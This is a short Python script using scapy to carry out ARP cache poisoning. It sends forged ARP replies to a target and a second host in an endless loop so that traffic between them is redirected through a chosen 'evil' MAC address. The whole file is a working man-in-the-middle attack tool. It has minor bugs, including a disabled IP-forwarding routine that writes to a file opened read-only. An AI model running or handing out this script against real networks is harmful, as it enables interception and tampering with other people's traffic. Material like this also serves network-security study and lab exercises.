#!/usr/bin/python3
from scapy.all import *
import argparse


def checkProc():
    with open('/proc/sys/net/ipv4/ip_forward') as f:
        if f.read() == 0:
            f.seek(0)
            f.write(1)
            f.truncate()
            print("Overwritten /proc/sys/net/ipv4/ip_forward val to 1")


def getEvilMac(friend, evilIP):
    getMac = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=friend, psrc=evilIP)
    response = srp(getMac, timeout=3)
    evilMac = response[0][0][1].hwdst

    if not evilMac:
        print(" [X] Couldn't pick up a MAC address to spoof for %s" % evilIP)
    else:
        return evilMac


def sendPoison(target, source, evilMac):
    send(ARP(op=2, pdst=target, psrc=source, hwsrc=evilMac))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Poison a target''s ARP cache with a given MAC address')
    parser.add_argument('-t', metavar='target', help='the target whose ARP cache we''re going for')
    parser.add_argument('-e', metavar='evil', help='the IP address we are spoofing traffic to')
    parser.add_argument('-f', metavar='friend', help='the friend of the target')

    # checkProc()

    args = parser.parse_args()
    target = args.t
    evilIP = args.e
    friend = args.f

    evilMac = getEvilMac(friend, evilIP)
    print("the evil MAC address is: %s" % evilMac)

    while True:
        sendPoison(target, friend, evilMac)
        sendPoison(friend, target, evilMac)
        time.sleep(1)
